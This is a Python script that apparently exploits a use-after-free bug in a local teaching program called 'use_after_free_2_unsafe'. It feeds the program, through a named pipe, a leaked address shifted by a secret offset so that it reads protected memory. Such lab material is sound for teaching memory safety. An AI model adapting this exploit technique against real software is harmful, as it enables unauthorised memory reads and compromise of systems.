import os
import subprocess

DATA_FILE = "data_2.bin"
PROCESS_NAME = "./use_after_free_2_unsafe"
SECRET_OFFSET = 32

def main():
    os.mkfifo(DATA_FILE)
    try:
        process = subprocess.Popen(
            [PROCESS_NAME, DATA_FILE], bufsize = 1, text = True,
            stdout = subprocess.PIPE, stderr = subprocess.STDOUT)

        f = open(DATA_FILE, "wb", buffering = 0)
        try:
            line = process.stdout.readline()
            print(line, end = "")

            # Turn address into bytes
            addr = bytes.fromhex(line[11:-2].zfill(16))[::-1]

            # Calculate offset
            addr = (int.from_bytes(addr, "little") + SECRET_OFFSET)\
                   .to_bytes(8, "little")

            f.write(b"\x00" * 8 + addr)

            f.write(b"\x00" * 16 * 10)
        except BrokenPipeError:
            print("Pipe Broken")
        finally:
            # Try printing out everything else from process
            print(process.stdout.read(), end = "")
            f.close()

        poll = process.wait()
        if poll != 0:
            print(f"$ poll = {poll!r}")
    finally:
        os.unlink(DATA_FILE)

if __name__ == "__main__":
    main()
